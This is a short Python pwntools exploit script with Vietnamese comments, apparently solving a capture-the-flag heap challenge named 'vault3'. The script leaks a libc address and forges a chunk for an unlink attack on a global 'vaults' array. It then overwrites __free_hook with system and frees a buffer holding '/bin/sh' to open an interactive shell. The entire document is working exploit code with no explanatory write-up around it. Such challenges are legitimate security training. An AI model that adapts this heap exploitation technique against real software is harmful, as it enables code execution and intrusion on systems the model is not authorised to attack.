from pwn import *

context.binary = elf = ELF("./vault3", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

p = process()

# lấy địa chỉ puts để tính base libc
p.recvuntil(b"is ")
libc.address = int(p.recvline().strip(), 16) - libc.sym.puts
log.info(f"libc base = {hex(libc.address)}")

# helper
cmd = lambda c: p.sendlineafter(b"> ", str(c).encode())
create = lambda i: (cmd(1), p.sendlineafter(b"create? ", str(i).encode()))
edit   = lambda i, d: (cmd(2), p.sendline(str(i).encode()), p.sendafter(b"vault? ", d))
free   = lambda i: (cmd(3), p.sendlineafter(b"free? ", str(i).encode()))

# tạo fake chunk để unlink
create(0); create(1)
payload  = flat(
    0, 0x81,
    elf.sym.vaults - 0x18,
    elf.sym.vaults - 0x10,
) + b"\x00"*0x60 + flat(0x80, 0x90)
edit(0, payload)
free(1)

# arbitrary write → free_hook = system
edit(0, flat(0, libc.sym._IO_2_1_stderr_, 0, libc.sym.__free_hook))
edit(0, p64(libc.sym.system))

# trigger
edit(1, b"/bin/sh\x00")
free(1)

p.interactive()
